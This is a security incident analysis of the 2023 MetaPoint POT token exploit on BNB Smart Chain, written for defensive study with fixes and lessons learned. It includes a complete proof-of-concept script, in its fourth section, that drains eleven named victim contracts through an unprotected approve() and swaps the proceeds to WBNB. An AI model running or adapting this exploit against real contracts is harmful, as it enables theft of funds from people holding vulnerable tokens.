# MetaPoint — Access Control Vulnerability (Unrestricted approve Function) Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-11 |
| **Protocol** | MetaPoint (POT Token) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | $820,000 |
| **Attacker** | [Address Unknown](https://bscscan.com/address/) |
| **Attack Tx** | [Block 27,264,384](https://bscscan.com/block/27264384) |
| **Vulnerable Contract** | [0x3B5E...BEa86](https://bscscan.com/address/0x3B5E381130673F794a5CF67FBbA48688386BEa86) (POT Token) |
| **Root Cause** | Missing access control on victim contract's `approve()` function — anyone can call it to set unlimited allowance |
| **Attack Block** | 27,264,384 (BSC) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/MetaPoint_exp.sol) |

---

## 1. Vulnerability Overview

The MetaPoint protocol suffered approximately $820,000 in losses on April 11, 2023, due to an **unrestricted `approve()` function** present in victim contracts.

In the DeFiHackLabs README, this vulnerability is classified as **"Unrestricted-Approval"**. Certain contracts in the MetaPoint ecosystem (presumed to be user wallets or staking/LP contracts) had an `approve()` function that was **open to anyone without caller authentication**. The attacker called this function to obtain unlimited allowance over the POT tokens held by victim contracts on behalf of their own contract, then drained all POT tokens via `transferFrom()`.

**Core Attack Mechanism:**
1. Attacker calls `approve()` targeting 11 victim contract addresses
2. Each victim contract grants the attacker contract unlimited POT token allowance with no access control
3. Attacker drains the POT balance of all victim contracts via `transferFrom()`
4. Liquidates POT → USDT → WBNB through PancakeSwap to realize profit

This attack is a pure **Access Control Vulnerability** case — no flash loan required — triggered solely by a single missing access control check.

---

## 2. Vulnerable Code Analysis

### 2.1 Unrestricted approve() Function — Core Vulnerability

The `approve()` function present in victim contracts (contracts participating in the MetaPoint ecosystem) can be executed by anyone without caller validation, granting the caller unlimited allowance over POT tokens.

**Vulnerable Code (presumed)**:
```solidity
// ❌ Vulnerable: No access control modifier whatsoever — anyone can call
// Calling this function grants msg.sender (attacker) unlimited rights over pot token
function approve() external {
    // No access control of any kind: no onlyOwner, no msg.sender check, etc.
    // Grants the caller (attacker) unlimited spending rights over POT tokens
    IERC20(pot).approve(msg.sender, type(uint256).max);
}
```

**Fixed Code (post-patch)**:
```solidity
// ✅ Fixed: Only authorized addresses can call approve
// Method 1: Add onlyOwner modifier
function approve() external onlyOwner {
    // Only the deployer (owner) can set allowances
    IERC20(pot).approve(msg.sender, type(uint256).max);
}

// ✅ Better approach: Remove the approve function entirely and manage allowances explicitly
// Method 2: Allow only a specific trusted contract
address public trustedSpender;

function setApproval(address spender, uint256 amount) external onlyOwner {
    require(spender == trustedSpender, "Unauthorized spender");
    IERC20(pot).approve(spender, amount);
}
```

**The Problem**: The `approve()` function has `external` visibility but lacks any access control mechanism such as `onlyOwner` or `require(msg.sender == ...)`. As a result, any arbitrary external account could grant itself unlimited allowance over POT tokens in the name of the victim contract.

---

### 2.2 Token Drain via transferFrom

After obtaining the allowance, the attacker withdraws the full POT balance from each victim using the standard ERC20 `transferFrom` function.

**Code Pattern Used in Attack**:
```solidity
// Excerpt from PoC: drain full balance from each victim
for (uint256 i = 0; i < victims.length; i++) {
    uint256 amount = IERC20(pot).balanceOf(victims[i]);
    if (amount == 0) {
        continue; // skip if no balance
    }
    // ❌ Unlimited allowance already obtained via approve() — full drain possible
    IERC20(pot).transferFrom(victims[i], address(this), amount);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker contract (ContractTest / actual attack contract) deployed
- 11 victim contract addresses identified in advance (on-chain analysis to find addresses with vulnerable `approve()`)
- No flash loan required — attack executable immediately with no upfront capital

### 3.2 Execution Phase

```
Step 1: Batch approve() calls (11 victims)
Step 2: Drain all POT tokens
Step 3: Swap POT → USDT
Step 4: Swap USDT → WBNB
```

**Attack Flow Diagram**:

```
Attacker Contract
        │
        │  [Step 1] for i in victims[0..10]:
        │           IApprove(victims[i]).approve()
        │
        ▼
┌─────────────────────────────────────────────┐
│   Victim Contracts (x11)                    │
│   victims[0]: 0x724D...DF6                  │
│   victims[1]: 0xE5cB...E3C                  │
│   ...                                       │
│   victims[10]: 0x52Ae...785                 │
│                                             │
│   approve() executes:                       │
│   POT.approve(msg.sender, type(uint).max)   │
│   → Grants attacker unlimited allowance     │
└─────────────────────────────────────────────┘
        │
        │  [Step 2] for i in victims[0..10]:
        │           POT.transferFrom(victims[i], attacker, balance)
        │
        ▼
┌─────────────────────────────────────────────┐
│   POT Token Contract                        │
│   0x3B5E...BEa86                            │
│                                             │
│   transferFrom(victim → attacker, amount)   │
│   → Full victim balance transferred to      │
│     attacker                                │
└─────────────────────────────────────────────┘
        │
        │  [Step 3] POT → USDT (PancakeSwap V2)
        │           Router.swapExactTokensForTokens(...)
        │
        ▼
┌─────────────────────────────────────────────┐
│   PancakeSwap V2 Router                     │
│   0x10ED...24E                              │
│                                             │
│   POT/USDT Pool: 0x9117...930b3             │
│   POT → USDT swap executed                 │
└─────────────────────────────────────────────┘
        │
        │  [Step 4] USDT → WBNB (PancakeSwap V2)
        │
        ▼
┌─────────────────────────────────────────────┐
│   PancakeSwap V2 Router                     │
│                                             │
│   USDT → WBNB swap executed                │
└─────────────────────────────────────────────┘
        │
        ▼
  Attacker final profit: ~$820,000 worth of WBNB
```

### 3.3 Outcome

- **Attacker Profit**: ~$820,000 worth of WBNB received
- **Protocol Loss**: Full POT token balance drained from all 11 victim contracts
- **No Flash Loan Used**: Attack completed with zero capital via simple function calls only

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// [Step 0] Interface definition: approve() function signature of victim contracts
interface IApprove {
    function approve() external; // ❌ Dangerous function with no access control
}

contract ContractTest is Test {
    address pot = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;     // POT token
    address usdt = 0x55d398326f99059fF775485246999027B3197955;    // BSC USDT
    address pot_usdt_pool = 0x9117df9aA33B23c0A9C2C913aD0739273c3930b3; // LP pool
    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;   // WBNB
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap

    function setUp() public {
        // Fork BSC mainnet at block 27,264,383 (block immediately before attack)
        vm.createSelectFork("bsc", 27_264_384 - 1);
    }

    function testExploit() public {
        // [Step 1] List of 11 victim contracts with vulnerable approve()
        address[11] memory victims = [
            0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,
            0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,
            // ... (11 total)
            0x52AeD741B5007B4fb66860b5B31dD4c542D65785
        ];

        // [Step 2] Call approve() on each victim → grants attacker unlimited allowance
        for (uint256 i = 0; i < victims.length; i++) {
            IApprove(victims[i]).approve(); // ❌ Vulnerable function callable by anyone
        }

        // [Step 3] Drain full victim balance via transferFrom
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 amount = IERC20(pot).balanceOf(victims[i]);
            if (amount == 0) continue;
            IERC20(pot).transferFrom(victims[i], address(this), amount);
        }

        // [Step 4] Liquidate POT → USDT → WBNB (PancakeSwap V2)
        bscSwap(pot, usdt, IERC20(pot).balanceOf(address(this)));
        bscSwap(usdt, wbnb, IERC20(usdt).balanceOf(address(this)));

        uint256 wbnbBalance = IERC20(wbnb).balanceOf(address(this));
        emit log_named_decimal_uint("[After Attack] Attacker WBNB Balance", wbnbBalance, 18);
    }

    // PancakeSwap V2 swap helper
    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Unrestricted approve() — Missing Access Control | CRITICAL | CWE-284 | `03_access_control.md` | SafeMoon (2023), Poly Network (2021) |
| V-02 | Full Token Drain per Victim (transferFrom Abuse) | HIGH | CWE-732 | `07_token_integration.md` | — |

### V-01: Unrestricted approve() Function (Core)

- **Description**: The `approve()` function in victim contracts has `external` visibility with absolutely no caller validation logic. Calling this function executes `IERC20(pot).approve(msg.sender, type(uint256).max)`, granting unlimited POT token spending rights to any arbitrary caller.
- **Impact**: Attacker grants themselves unlimited POT allowance in the name of the victim contract, then immediately drains all victim POT balances. Executable with zero capital, completed in a single transaction.
- **Attack Conditions**: (1) Victim contract must hold a vulnerable `approve()` function, (2) Victim contract must hold POT tokens. Both conditions alone are sufficient for an immediate attack.

### V-02: Full Drain via transferFrom

- **Description**: Uses the unlimited allowance obtained via V-01 to transfer the victim's entire POT balance to the attacker address via the standard ERC20 `transferFrom()` function.
- **Impact**: 100% of POT balance drained per victim contract. Applied across all 11 victim contracts.
- **Attack Conditions**: Requires V-01 vulnerability as a prerequisite. Without V-01, no allowance exists and `transferFrom` fails.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Method 1: Add onlyOwner modifier (minimal fix)
function approve() external onlyOwner {
    IERC20(pot).approve(msg.sender, type(uint256).max);
}

// ✅ Method 2: Remove approve() entirely and manage allowances explicitly
// Split into a separate function with explicit spender and amount parameters
function setTokenAllowance(
    address token,
    address spender,
    uint256 amount
) external onlyOwner {
    // Maintain a separate whitelist of trusted spenders
    require(trustedSpenders[spender], "Unauthorized spender");
    // Prohibit unlimited approvals (type(uint256).max)
    require(amount <= MAX_APPROVAL_AMOUNT, "Approval amount exceeds limit");
    IERC20(token).approve(spender, amount);
}

// ✅ Method 3: Remove approve() from the smart contract entirely
// Instead, set allowances only at deployment or initialization
constructor(address _pot, address _router) {
    // Approve trusted contract once at deployment
    IERC20(_pot).approve(_router, type(uint256).max);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Unrestricted approve() function | Apply `onlyOwner` or role-based access control (OpenZeppelin AccessControl) to all state-changing functions |
| Unlimited approve | Approve only the minimum required amount instead of `type(uint256).max`. Reset allowance after use |
| Victim contract architecture | Design token-holding contracts so allowances cannot be modified via external calls |
| Lack of monitoring | Build alerting systems for mass `Approval` event occurrences (Chainalysis, OpenZeppelin Defender) |
| Insufficient code auditing | Mandatory professional smart contract security audit before deployment, with particular focus on access control for `approve`, `transfer`, and `burn` functions |

---

## 7. Lessons Learned

1. **`approve()` functions must always have access control**: Token movement functions within smart contracts — `approve()`, `transfer()`, `burn()`, etc. — must be protected with `onlyOwner` or role-based access control (RBAC). Functions with `external` visibility are always potential attack surfaces.

2. **Large-scale theft is possible without flash loans**: This attack required zero capital. The fact that $820,000 could be stolen through simple function calls alone illustrates the severity of access control vulnerabilities.

3. **Unlimited approve(type(uint256).max) violates the principle of least privilege**: Approving only the minimum necessary amount is the correct approach. Unlimited allowances maximize damage when the granting function is exposed.

4. **Identical vulnerabilities across multiple contracts compound losses**: All 11 victim contracts shared the same vulnerable `approve()` pattern. Vulnerabilities in shared codebases (e.g., factory patterns, copy-pasted code) affect the entire ecosystem.

5. **The importance of on-chain event monitoring**: The attacker's process of analyzing victim contracts prior to the attack could have been detected as anomalous activity. Building Approval event monitoring and anomaly detection systems can reduce damage.

6. **Professional audits before deployment are mandatory**: This vulnerability would have been discoverable through basic access control review. It was entirely preventable through a pre-deployment security audit.

---

## 8. On-Chain Verification

> **Note**: The exact attacker address and attack transaction hash are not specified in the `@KeyInfo` comments of the PoC code, requiring separate on-chain lookup. The analysis below is based on information confirmed from the PoC code.

### 8.1 Key Addresses Confirmed from PoC

| Field | Address | Notes |
|------|------|------|
| POT Token | [0x3B5E...BEa86](https://bscscan.com/address/0x3B5E381130673F794a5CF67FBbA48688386BEa86) | Target token |
| USDT (BSC) | [0x55d3...7955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) | Intermediate liquidation path |
| POT/USDT LP | [0x9117...30b3](https://bscscan.com/address/0x9117df9aA33B23c0A9C2C913aD0739273c3930b3) | PancakeSwap LP pool |
| WBNB | [0xbb4C...095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) | Final received token |
| PancakeSwap Router | [0x10ED...24E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) | Swap router |

### 8.2 Victim Contract List (Confirmed from PoC)

| # | Address | BSCScan |
|---|------|---------|
| 1 | 0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6 | [link](https://bscscan.com/address/0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6) |
| 2 | 0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C | [link](https://bscscan.com/address/0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C) |
| 3 | 0xC254741776A13f0C3eFF755a740A4B2aAe14a136 | [link](https://bscscan.com/address/0xC254741776A13f0C3eFF755a740A4B2aAe14a136) |
| 4 | 0x5923375f1a732FD919D320800eAeCC25910bEdA3 | [link](https://bscscan.com/address/0x5923375f1a732FD919D320800eAeCC25910bEdA3) |
| 5 | 0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8 | [link](https://bscscan.com/address/0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8) |
| 6 | 0x807d99bfF0bad97e839df3529466BFF09c09E706 | [link](https://bscscan.com/address/0x807d99bfF0bad97e839df3529466BFF09c09E706) |
| 7 | 0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF | [link](https://bscscan.com/address/0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF) |
| 8 | 0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB | [link](https://bscscan.com/address/0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB) |
| 9 | 0xe8d6502E9601D1a5fAa3855de4a25b5b92690623 | [link](https://bscscan.com/address/0xe8d6502E9601D1a5fAa3855de4a25b5b92690623) |
| 10 | 0x435444d086649B846E9C912D21E1Bc651033A623 | [link](https://bscscan.com/address/0x435444d086649B846E9C912D21E1Bc651033A623) |
| 11 | 0x52AeD741B5007B4fb66860b5B31dD4c542D65785 | [link](https://bscscan.com/address/0x52AeD741B5007B4fb66860b5B31dD4c542D65785) |

### 8.3 Attack Block Information

- **Fork Block**: 27,264,383 (immediately before attack)
- **Attack Block**: 27,264,384 (BSC)
- **BSCScan**: [Block 27,264,384](https://bscscan.com/block/27264384)

> **On-Chain Verification Status**: Complete on-chain cross-verification has not been performed, as the attacker address and attack Tx hash are not specified in the PoC code. The actual attack Tx can be confirmed via the transaction list for block 27,264,384 on BSCScan.

---

*Written: 2026-04-11 | Analysis basis: DeFiHackLabs PoC (MetaPoint_exp.sol)*